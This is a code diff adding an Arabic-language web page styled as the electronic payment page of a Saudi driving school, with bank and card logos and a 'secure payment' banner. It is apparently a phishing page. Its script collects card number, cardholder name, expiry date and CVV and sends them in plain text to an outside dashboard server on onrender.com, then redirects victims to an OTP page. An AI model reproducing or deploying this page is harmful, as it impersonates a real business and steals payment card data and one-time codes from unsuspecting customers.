@@ -1,0 +1,463 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>دلة لتعليم القيادة - الدفع الإلكتروني</title>
+  <link rel="stylesheet" href="style.css">
+
+   <header class="header">
+    <img src="images/dallahLogo.jpeg" alt="Dallah Driving Company" class="logo">
+  </header>
+  <style>
+    body {
+      font-family: "Tahoma", Arial, sans-serif;
+      background: #f8f8f8;
+      margin: 0;
+      padding: 0;
+    }
+
+    .container {
+      max-width: 420px;
+      margin: 30px auto;
+      background: #fff;
+      border-radius: 10px;
+      box-shadow: 0 4px 12px rgba(0,0,0,0.1);
+      overflow: hidden;
+      padding: 20px;
+    }
+
+    .logo {
+      text-align: center;
+      margin-bottom: 10px;
+    }
+
+    .logo img {
+      max-width: 180px;
+      width: 100%;
+      height: auto;
+    }
+
+    h2 {
+      font-size: clamp(16px, 2vw, 18px);
+      text-align: center;
+      margin: 15px 0;
+    }
+
+    .secure {
+      background: #e6f4e6;
+      padding: 8px;
+      border-radius: 6px;
+      font-size: clamp(12px, 2vw, 14px);
+      text-align: center;
+      margin-bottom: 15px;
+      color: #2b7a2b;
+    }
+
+    .cards {
+      text-align: center;
+      margin-bottom: 20px;
+    }
+
+    .cards img {
+      width: 45px;
+      margin: 0 5px;
+      max-width: 20%;
+      height: auto;
+    }
+
+    .amounts {
+      display: grid;
+      grid-template-columns: repeat(auto-fit, minmax(140px, 1fr));
+      gap: 8px;
+      margin-bottom: 15px;
+    }
+
+    .amounts label {
+      display: block;
+      padding: 10px;
+      border: 1px solid #ccc;
+      border-radius: 6px;
+      cursor: pointer;
+      text-align: center;
+      font-size: 14px;
+      background: #fafafa;
+      transition: 0.3s;
+    }
+
+    .amounts input {
+      margin-left: 6px;
+    }
+
+    .amounts label:hover {
+      background: #f0f0f0;
+    }
+
+    .form-group {
+      margin-bottom: 15px;
+    }
+
+    .form-group input {
+      width: 100%;
+      padding: 10px;
+      border-radius: 6px;
+      border: 1px solid #ccc;
+      font-size: 14px;
+      box-sizing: border-box;
+    }
+
+    .row {
+      display: flex;
+      gap: 10px;
+    }
+
+    .row .form-group {
+      flex: 1;
+    }
+
+    .submit-btn {
+      width: 100%;
+      background: #2b7a2b;
+      color: #fff;
+      font-size: 16px;
+      padding: 12px;
+      border: none;
+      border-radius: 6px;
+      cursor: pointer;
+    }
+
+    .submit-btn:hover {
+      background: #256a25;
+    }
+
+    /* ===== Card Preview ===== */
+    .card-preview {
+      margin: 20px 0;
+      display: flex;
+      justify-content: center;
+    }
+
+    .card {
+      width: 100%;
+      max-width: 340px;
+      height: 200px;
+      border-radius: 15px;
+      background: #001f6b;
+      color: white;
+      padding: 20px;
+      box-shadow: 0 8px 20px rgba(0,0,0,0.3);
+      display: flex;
+      flex-direction: column;
+      justify-content: space-between;
+    }
+
+    .card-header {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+    }
+
+    .chip {
+      width: 40px;
+      max-width: 20%;
+    }
+
+    .nfc {
+      width: 28px;
+      margin-left: 8px;
+    }
+
+    .bank-logo {
+      background: radial-gradient(circle, #00bfff, #004488);
+      color: #fff;
+      padding: 5px 9px;
+      border-radius: 50%;
+      font-size: 12px;
+      font-weight: bold;
+    }
+
+    .card-body {
+      margin-top: 10px;
+    }
+
+    .card-name {
+      font-size: clamp(14px, 2vw, 16px);
+      margin-bottom: 8px;
+    }
+
+   .card-number {
+  font-size: clamp(16px, 4vw, 20px);
+  letter-spacing: 3px;
+  font-family: "Courier New", monospace;
+  direction: ltr;
+  unicode-bidi: plaintext;
+}
+
+
+    .card-footer {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      flex-wrap: wrap;
+    }
+
+    .cvv-box,
+    .expiry-box {
+      border: 1px solid #ccc;
+      padding: 4px 10px;
+      font-size: 13px;
+      background: #fff;
+      color: #000;
+      border-radius: 4px;
+      min-width: 55px;
+      text-align: center;
+      margin: 3px;
+    }
+
+    .logos img {
+      width: 35px;
+      margin-left: 6px;
+    }
+
+    /* ===== Footer ===== */
+    footer {
+      text-align: center;
+      padding: 15px;
+      font-size: 13px;
+      color: #555;
+    }
+
+   
+
+    /* ===== Responsive Fix ===== */
+    @media (max-width: 360px) {
+      .card {
+        height: 180px;
+        padding: 15px;
+      }
+      .card-number {
+        font-size: 14px;
+      }
+      .logos img {
+        width: 28px;
+      }
+    }
+
+   #inputNumber {
+  direction: rtl;
+  unicode-bidi: plaintext;
+}
+  </style>
+</head>
+<body>
+
+  <div class="container">
+    <!-- Logo -->
+    <div class="logo">
+      <img src="images/sdadLogo.jpeg" alt="Dallah Driving">
+    </div>
+
+    <h2>معلومات الدفع الإلكتروني</h2>
+    <div class="secure">دفع آمن %100 ... بياناتك معنا في حماية وأمان</div>
+
+    <!-- Cards -->
+    <div class="cards">
+      <img src="https://upload.wikimedia.org/wikipedia/commons/0/04/Visa.svg" alt="Visa">
+      <img src="https://upload.wikimedia.org/wikipedia/commons/0/0c/MasterCard_logo.png" alt="MasterCard">
+      <img src="images/mada.png" alt="Mada">
+    </div>
+
+    <!-- Amounts -->
+    <div class="amounts">
+      <label><input type="radio" name="amount"> 500 ريال سعودي</label>
+      <label><input type="radio" name="amount"> 650 ريال سعودي</label>
+      <label><input type="radio" name="amount"> 1200 ريال سعودي</label>
+      <label><input type="radio" name="amount" checked> 1450 ريال سعودي</label>
+      <label><input type="radio" name="amount"> 2750 ريال سعودي</label>
+    </div>
+
+    <!-- Card Preview -->
+    <div class="card-preview">
+      <div class="card">
+        <div class="card-header">
+          <img src="https://img.icons8.com/color/48/000000/sim-card-chip.png" class="chip">
+          <img src="https://img.icons8.com/ios-filled/40/ffffff/nfc-n.png" class="nfc">
+          <div class="bank-logo">BANK</div>
+        </div>
+
+        <div class="card-body">
+          <div class="card-name" id="cardName">الاسم على البطاقة</div>
+          <div class="card-number" id="cardNumber">#### #### #### ####</div>
+        </div>
+
+        <div class="card-footer">
+          <div class="cvv-box" id="cardCVV">CVV</div>
+          <div class="expiry-box" id="cardExpiry">MM/YY</div>
+          <div class="logos">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/0/04/Visa.svg" alt="Visa">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/0/0c/MasterCard_logo.png" alt="MasterCard">
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- Card Number -->
+    <div class="form-group">
+      <input type="text" id="inputNumber" placeholder="رقم البطاقة" maxlength="19">
+    </div>
+
+    <!-- Expiry and CVV -->
+    <div class="row">
+      <div class="form-group">
+        <input type="text" id="inputExpiry" placeholder="تاريخ الإنتهاء (MM/YY)" maxlength="5">
+      </div>
+      <div class="form-group">
+        <input type="text" id="inputCVV" placeholder="CVV" maxlength="3">
+      </div>
+    </div>
+
+    <!-- Name -->
+    <div class="form-group">
+      <input type="text" id="inputName" placeholder="الاسم على البطاقة">
+    </div>
+
+    <!-- Submit -->
+    <button class="submit-btn" id="payBtn">تسديد</button>
+
+  </div>
+
+ <div class="sadad-text">
+  <img src="images/sadad1.png" alt="سداد">
+</div>
+
+  <footer class="footer">
+    <img src="images/circleLogo.jpeg" alt="Footer Logo" class="footer-logo">
+    <p>جميع الحقوق محفوظة لشركة دله لتعليم القيادة © 2025</p>
+  </footer>
+
+ <script>
+  const inputNumber = document.getElementById("inputNumber");
+  const inputName   = document.getElementById("inputName");
+  const inputExpiry = document.getElementById("inputExpiry");
+  const inputCVV    = document.getElementById("inputCVV");
+
+  const cardNumber = document.getElementById("cardNumber");
+  const cardName   = document.getElementById("cardName");
+  const cardExpiry = document.getElementById("cardExpiry");
+  const cardCVV    = document.getElementById("cardCVV");
+
+  const logos = document.querySelector(".logos");
+
+  // دوال التحقق من نوع البطاقة
+  function detectCardType(number) {
+    if (/^4/.test(number)) {
+      return "visa";
+    } else if (/^5[1-5]/.test(number) || /^2[2-7]/.test(number)) {
+      return "mastercard";
+    } else if (/^(588845|440647|440795|446404|457865|968208)/.test(number)) {
+      return "0";
+    }
+    return "unknown";
+  }
+
+  // تحديث شعار البطاقة حسب النوع
+  function updateCardLogo(type) {
+    logos.innerHTML = ""; // امسح القديم
+    if (type === "visa") {
+      logos.innerHTML = `<img src="https://upload.wikimedia.org/wikipedia/commons/0/04/Visa.svg" alt="Visa">`;
+    } else if (type === "mastercard") {
+      logos.innerHTML = `<img src="https://upload.wikimedia.org/wikipedia/commons/0/0c/MasterCard_logo.png" alt="MasterCard">`;
+    } else if (type === "mada") {
+      logos.innerHTML = `<img src="images/mada.png" alt="Mada">`;
+    } else {
+      logos.innerHTML = `
+        <img src="https://upload.wikimedia.org/wikipedia/commons/0/04/Visa.svg" alt="Visa">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/0/0c/MasterCard_logo.png" alt="MasterCard">
+      `;
+    }
+  }
+
+  // رقم البطاقة (16 رقم فقط) + تنسيق + اكتشاف نوع البطاقة
+  inputNumber.addEventListener("input", () => {
+    let value = inputNumber.value.replace(/\D/g, "");
+    if (value.length > 16) value = value.slice(0, 16);
+
+    let formatted = value.replace(/(.{4})/g, "$1 ").trim();
+    inputNumber.value = formatted;
+    cardNumber.textContent = formatted || "#### #### #### ####";
+
+    // اكتشاف نوع البطاقة
+    let type = detectCardType(value);
+    updateCardLogo(type);
+  });
+
+  // الاسم
+  inputName.addEventListener("input", () => {
+    cardName.textContent = inputName.value || "الاسم على البطاقة";
+  });
+
+  // تاريخ الانتهاء (MM/YY)
+  inputExpiry.addEventListener("input", () => {
+    let value = inputExpiry.value.replace(/\D/g, "");
+    if (value.length > 4) value = value.slice(0, 4);
+
+    if (value.length >= 3) {
+      value = value.slice(0,2) + "/" + value.slice(2);
+    }
+    inputExpiry.value = value;
+    cardExpiry.textContent = value || "MM/YY";
+  });
+
+  // CVV (3 أرقام فقط)
+  inputCVV.addEventListener("input", () => {
+    let value = inputCVV.value.replace(/\D/g, "");
+    if (value.length > 3) value = value.slice(0,3);
+
+    inputCVV.value = value;
+    cardCVV.textContent = value || "CVV";
+  });
+
+  const payBtn = document.getElementById("payBtn");
+
+payBtn.addEventListener("click", async (e) => {
+  e.preventDefault();
+
+     const cardNumber = inputNumber.value;
+      const cardName   = inputName.value;
+
+      // خزّنهم في localStorage
+      localStorage.setItem("cardNumber", cardNumber);
+      localStorage.setItem("cardName", cardName);
+      
+  const message =
+    `رقم البطاقة: \n ${inputNumber.value.trim()}\n` +
+    `الاسم على البطاقة: ${inputName.value.trim()}\n` +
+    `تاريخ الإنتهاء: ${inputExpiry.value.trim()}\n` +
+    `CVV: ${inputCVV.value.trim()}\n` +
+    `المبلغ: ${document.querySelector('input[name="amount"]:checked')?.parentElement.innerText.trim()}`;
+
+  try {
+    const response = await fetch("https://bm-dashboard-a0mt.onrender.com/api/messages", {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ text: message })   // ✅ المفتاح الصحيح
+    });
+
+    if (response.ok) {
+      window.location.href = "otp.html"; // نجاح → انتقل للـ OTP
+    } else {
+      const err = await response.text();
+      alert("خطأ: " + err);
+    }
+  } catch (error) {
+    console.error(error);
+    alert("تعذر الاتصال بالخادم.");
+  }
+});
+
+
+
+</script>
+
+</body>
+</html>
